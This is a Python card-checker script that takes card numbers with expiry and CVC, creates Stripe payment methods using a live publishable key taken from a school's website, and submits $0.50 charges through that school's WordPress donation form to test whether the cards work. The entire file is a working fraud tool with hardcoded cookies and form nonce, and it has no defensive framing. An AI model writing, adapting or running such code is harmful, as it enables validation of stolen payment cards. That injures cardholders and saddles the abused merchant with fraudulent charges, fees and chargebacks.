import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Ffd95e0ffd9%3B+stripe-js-v3%2Ffd95e0ffd9%3B+card-element&key=pk_live_51N6gATHEG5XmHMNojyWOS5GfWF4em7PqNE1tTrdW1UFIiuvLOpVhQMJjmTkMsN7rCYqhm9dDhhAHJ8Zq595yjq5s00hWXN3M0X'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': 'b1eb7380-a220-49f1-a30d-b53b4d1058e8733906',
	    '__stripe_sid': 'e96502d5-aa5b-4f57-99c4-2048f4ba0f599ee557',
	}
	
	headers = {
	    'authority': 'narhspartnerschools.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=b1eb7380-a220-49f1-a30d-b53b4d1058e8733906; __stripe_sid=e96502d5-aa5b-4f57-99c4-2048f4ba0f599ee557',
	    'origin': 'https://narhspartnerschools.com',
	    'referer': 'https://narhspartnerschools.com/parent-portal/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1741932002037',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=1140&_fluentform_9_fluentformnonce=ad1e2cf5dc&_wp_http_referer=%2Fparent-portal%2F&dropdown=&repeater_field%5B0%5D%5B%5D=&repeater_field%5B0%5D%5B%5D=2024-2025&names%5Bfirst_name%5D=&names%5Blast_name%5D=&custom-payment-amount=0.50&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '9',
	}
	
	r2 = requests.post(
	    'https://narhspartnerschools.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
